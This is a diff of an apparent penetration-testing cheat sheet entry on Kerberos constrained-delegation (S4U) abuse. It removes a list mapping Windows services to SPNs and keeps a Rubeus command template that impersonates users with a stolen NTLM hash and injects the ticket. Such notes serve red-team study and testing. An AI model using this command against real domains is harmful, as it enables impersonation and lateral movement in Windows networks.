@@ -34,15 +34,7 @@ DB admin: MSSQLSvc
 
 ## S4U - Constrained delegation abuse with alternative spn (pth)
 #cat/ATTACK/EXPLOIT 
-wmi: HOST, RPCSS
-PowerShell Remoting: HOST, HTTP
-WinRM: HOST, HTTP, WINRM
-Scheduled Tasks: HOST
-Windows File Share, also psexec: CIFS
-LDAP operations, included DCSync: LDAP
-Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
-Golden Tickets: krbtgt
-DB admin: MSSQLSvc
+
 ```
 .\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain_fqdn> /ptt
 ```
